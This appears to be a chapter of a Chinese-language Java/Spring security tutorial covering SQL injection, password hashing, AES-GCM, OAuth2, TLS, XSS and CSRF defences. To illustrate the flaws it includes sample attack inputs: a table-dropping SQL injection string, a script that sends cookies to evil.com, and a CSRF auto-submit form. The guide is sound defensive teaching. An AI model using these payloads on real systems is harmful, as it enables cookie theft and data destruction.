## 二、SQL Injection — 最危險的古老攻擊 <!-- 入門 -->

### 攻擊原理

```java
// ❌ 危險：字串拼接 SQL
String sql = "SELECT * FROM users WHERE username = '" + username + "'";

// 攻擊者輸入：username = "admin' OR '1'='1"
// 拼接後：SELECT * FROM users WHERE username = 'admin' OR '1'='1'
// 結果：返回所有用戶！

// 更危險的輸入：username = "'; DROP TABLE users; --"
// 拼接後：SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
// 結果：刪除整個 users 表！
```

```java
// ✅ 安全：PreparedStatement（參數化查詢）
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?");
ps.setString(1, username);  // 參數被當作「資料」不是「SQL程式碼」

// ✅ Spring Data JPA（底層也是 PreparedStatement）
userRepository.findByUsername(username);  // 安全

// ✅ 如果必須用原生 SQL（例如動態條件）：
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
// 用 :参数名，Spring 自動做參數化
```

## 三、密碼學基礎 <!-- 💡 進階 -->

### 三種密碼學工具

```
1. 對稱加密（Symmetric Encryption）：
   加密和解密用同一把金鑰
   
   明文 ──[Key]──→ 密文 ──[Key]──→ 明文
   
   代表算法：AES（Advanced Encryption Standard）
   用途：加密資料庫裡的敏感資料（身分證號、信用卡號）
   
   問題：怎麼安全地傳遞這把「共同金鑰」給對方？

2. 非對稱加密（Asymmetric Encryption）：
   有兩把金鑰：公鑰（Public Key）和私鑰（Private Key）
   用公鑰加密 → 只有私鑰能解密
   用私鑰簽名 → 任何人用公鑰可以驗證

   代表算法：RSA（2048/4096 bit），ECC（更新更快）
   用途：HTTPS 握手、JWT 簽名、數位簽章
   
   問題：計算慢（比 AES 慢 100-1000 倍）

3. 雜湊（Hash）：
   單向函數：只能從明文 → 雜湊值，無法反推
   同樣的輸入永遠得到同樣的輸出
   任何一個 bit 改動，輸出完全不同
   
   代表算法：SHA-256（安全），MD5（已不安全，不要用！）
   用途：密碼儲存、資料完整性驗證
```

### 密碼儲存正確做法

```java
// ❌ 錯誤：明文儲存密碼
userTable.save(new User(username, password));  // 資料庫洩露就完了

// ❌ 錯誤：MD5 或 SHA-256 直接雜湊
String hashed = DigestUtils.md5Hex(password);  // 可以被彩虹表破解！

// ❌ 錯誤：SHA-256 + 固定 Salt
String salt = "my-app-salt-123";
String hashed = DigestUtils.sha256Hex(salt + password);
// 彩虹表 + 固定 Salt 還是可以提前計算

// ✅ 正確：BCrypt（自動加鹽 + 慢速雜湊）
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);  // 12 = cost factor，越大越慢越安全
    // cost=12：單次雜湊約 300ms（攻擊者暴力破解每次都要花 300ms）
    // cost=10（預設）：約 100ms（仍安全，但稍快）
}

// 儲存密碼
String encoded = passwordEncoder.encode(rawPassword);
// $2a$12$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// ↑bcrypt版本↑cost↑22位salt↑31位hash

// 驗證密碼
boolean matches = passwordEncoder.matches(rawPassword, encodedPassword);
```

### AES 加密敏感資料

```java
/**
 * 加密資料庫中的敏感欄位（例如：用戶的銀行帳號）
 * 使用 AES-256-GCM（認證加密模式，防止資料被篡改）
 */
@Service
public class AesEncryptionService {

    private static final String ALGORITHM = "AES/GCM/NoPadding";
    private static final int GCM_IV_LENGTH  = 12;  // 推薦 12 bytes
    private static final int GCM_TAG_LENGTH = 128; // 認證標籤 128 bits

    // 從環境變數取得金鑰（永遠不要把金鑰硬編碼在程式碼！）
    private final SecretKey secretKey;

    public AesEncryptionService(@Value("${app.encryption.key}") String keyBase64) {
        byte[] keyBytes = Base64.getDecoder().decode(keyBase64);
        this.secretKey = new SecretKeySpec(keyBytes, "AES");
    }

    public String encrypt(String plaintext) {
        byte[] iv = new byte[GCM_IV_LENGTH];
        new SecureRandom().nextBytes(iv);   // 每次加密產生新的隨機 IV（重要！）

        GCMParameterSpec paramSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, paramSpec);

        byte[] encrypted = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));

        // 把 IV 附在密文前面（IV 可以公開，每次不同確保安全性）
        ByteBuffer result = ByteBuffer.allocate(iv.length + encrypted.length);
        result.put(iv);
        result.put(encrypted);
        return Base64.getEncoder().encodeToString(result.array());
    }

    public String decrypt(String ciphertextBase64) {
        byte[] decoded = Base64.getDecoder().decode(ciphertextBase64);
        ByteBuffer buffer = ByteBuffer.wrap(decoded);

        byte[] iv = new byte[GCM_IV_LENGTH];
        buffer.get(iv);   // 讀取 IV
        byte[] ciphertext = new byte[buffer.remaining()];
        buffer.get(ciphertext);

        GCMParameterSpec paramSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, secretKey, paramSpec);
        return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
    }
}
```

## 四、OAuth2 授權流程 <!-- 🔴 資深 -->

### 為什麼需要 OAuth2？

```
問題：用戶想讓第三方 App（例如記帳軟體）讀取他的交易記錄
      但他不想把帳號密碼給記帳軟體

OAuth2 解法：
  1. 記帳軟體說「我需要讀你的交易記錄，幫我向交易所申請」
  2. 用戶跳轉到交易所登入頁（用戶自己輸入密碼，記帳軟體看不到）
  3. 交易所問用戶「允許記帳軟體讀取你的交易記錄嗎？」
  4. 用戶點「允許」
  5. 交易所給記帳軟體一個「Access Token」（有效期限，只有讀取權限）
  6. 記帳軟體用 Token 讀取資料（從不知道用戶的密碼！）
```

### Authorization Code Flow（最安全的流程）

```
Client（記帳App）    User（用戶）    Auth Server（交易所）    Resource Server（交易所API）

1. 用戶點「連結交易所」
                  │
2. 跳轉到 Auth Server 登入頁
                  │
3. 用戶輸入帳密並授權
                  │
4. Auth Server 發給 Client 一個短期的 Authorization Code（從 URL 回調）
                  │
5. Client 用 Authorization Code + Client Secret 換取 Access Token
   （這步在後端做，用戶看不到，更安全）
                  │
6. Client 得到 Access Token（JWT 格式）
                  │
7. Client 用 Access Token 呼叫 Resource Server API
                  │
8. Resource Server 驗證 Token 並返回資料
```

```java
// Spring Security OAuth2 Resource Server（保護你的 API）
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            // 讓 Spring Security 驗證 JWT Access Token
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    // 從 Auth Server 的 JWKS（JSON Web Key Set）取得公鑰驗證 JWT
                    .jwkSetUri("https://auth.example.com/.well-known/jwks.json")
                )
            );
        return http.build();
    }
}
```

## 五、TLS/HTTPS 握手原理 <!-- 🔴 資深 -->

```
為什麼 HTTPS 需要非對稱加密 + 對稱加密兩種？
  非對稱加密（RSA）：解決「金鑰傳遞問題」，但很慢
  對稱加密（AES）：加密資料，快，但需要預先共享金鑰

TLS 1.3 握手（簡化版）：

客戶端                           伺服器
    │                               │
    │── ClientHello ───────────────→│  我支援哪些加密算法？
    │                               │
    │←── ServerHello ──────────────│  我選這個算法
    │←── Certificate ──────────────│  我的公鑰證書（CA 簽名的）
    │←── ServerKeyShare ───────────│  用於 ECDHE 的公鑰
    │                               │
    │── ClientKeyShare ────────────→│  用於 ECDHE 的公鑰
    │                               │
    │  雙方用 ECDHE 各自計算出相同的「會話金鑰」（Session Key）│
    │  （第三方就算監聽了上面所有訊息也算不出 Session Key）   │
    │                               │
    │── Finished ──────────────────→│  用 Session Key 加密
    │←── Finished ──────────────────│  用 Session Key 加密
    │                               │
    │═══ 加密的 HTTP 資料 ══════════│  全程用 AES 對稱加密
    │                               │

ECDHE = Elliptic Curve Diffie-Hellman Ephemeral
  「前向保密（Forward Secrecy）」：就算私鑰洩漏，過去的通訊也無法解密
  （每次連線產生新的臨時金鑰對，連線結束後銷毀）

硬體數字：
  TLS 1.3 握手：~0.5ms（RTT 1 次，比 TLS 1.2 的 2 次快）
  AES-256-GCM 加密速度：~1 GB/s（現代 CPU 有 AES-NI 指令集加速）
```

## 六、常見安全漏洞防禦清單 <!-- 💡 進階 -->

### XSS（跨站腳本攻擊）

```java
// ❌ 危險：直接把用戶輸入插入 HTML
model.addAttribute("comment", userInput);  // 前端直接渲染

// 攻擊：userInput = "<script>document.location='http://evil.com/'+document.cookie</script>"
// 結果：所有看到這個留言的用戶的 Cookie 都被發到攻擊者的伺服器！

// ✅ 解法一：Thymeleaf 自動 HTML 轉義
// <p th:text="${comment}">（不是 th:utext）自動把 < 轉成 &lt;

// ✅ 解法二：Spring Security 的 HTTP Headers
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; script-src 'self'")
        // CSP 告訴瀏覽器：只執行來自本站的 JavaScript
    )
);
```

### CSRF（跨站請求偽造）

```
攻擊：
  攻擊者網站有一個隱藏表單：
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit();</script>

  用戶在瀏覽攻擊者網站時，瀏覽器自動帶上 bank.com 的 Cookie 提交表單！

防禦：
  Spring Security 預設開啟 CSRF 保護（Token 機制）
  REST API（純 JSON，無表單）可以關閉 CSRF
  改用 SameSite Cookie：Cookie 只在同源請求時發送
```

```java
// REST API 配置：關閉 CSRF，用 JWT 代替 Cookie
http
    .csrf(csrf -> csrf.disable())    // REST API 不需要 CSRF
    .sessionManagement(sm -> sm.sessionCreationPolicy(STATELESS));  // 無 Session

// Cookie 設定 SameSite（防 CSRF 的另一個手段）
ResponseCookie cookie = ResponseCookie.from("session", token)
    .sameSite("Strict")   // Strict：只有完全同源才發送 Cookie
    .httpOnly(true)       // 不允許 JavaScript 讀取（防 XSS 竊取 Cookie）
    .secure(true)         // 只在 HTTPS 發送
    .build();
```

### 敏感資料洩漏防禦

```java
// ❌ 危險：在 API 返回中暴露不必要的資料
public User getUser(String userId) {
    return userRepository.findById(userId);  // 可能包含 passwordHash, creditCard 等！
}

// ✅ 正確：使用 DTO 只返回必要欄位
public UserDTO getUser(String userId) {
    User user = userRepository.findById(userId).orElseThrow();
    return new UserDTO(user.getId(), user.getName(), user.getEmail());
    // 不包含 passwordHash, phoneNumber, creditCard 等敏感資料
}

// ✅ @JsonIgnore：永遠不要序列化這個欄位
@Entity
public class User {
    @JsonIgnore              // Jackson 序列化時忽略
    private String passwordHash;
}

// ✅ 日誌脫敏
// ❌ 不好：log.info("用戶 {} 登入，密碼 {}", username, password);
// ✅ 好的：log.info("用戶 {} 登入成功", username);  // 永遠不 log 密碼！
```

## 八、本章總結

```
安全工程的基本原則：

1. 最小權限（Principle of Least Privilege）：
   每個服務、每個用戶只擁有完成工作所需的最小權限
   資料庫帳號不要用 root；API 不要返回用戶不需要的資料

2. 縱深防禦（Defense in Depth）：
   不要依賴單一安全措施
   WAF → API Gateway 限流 → Spring Security → 參數化查詢 → 最小權限 DB 帳號
   每一層都做防禦，一層被突破還有下一層

3. 安全左移（Shift Left）：
   不要等系統上線後再考慮安全
   程式碼審查時就要看安全問題
   CI Pipeline 加入安全掃描（SAST/SCA）
   第34章 CI/CD 已整合

4. 不信任任何輸入：
   所有用戶輸入都要驗證和轉義
   包括：URL 參數、HTTP Header、Request Body、File Upload

常見錯誤速查：
  ❌ 字串拼 SQL → ✅ PreparedStatement
  ❌ 明文儲存密碼 → ✅ BCrypt
  ❌ JWT Secret 硬編碼 → ✅ 環境變數 + Vault
  ❌ 過期依賴 → ✅ OWASP Dependency Check
  ❌ 錯誤訊息暴露 Stack Trace → ✅ 統一錯誤處理，返回通用訊息
```
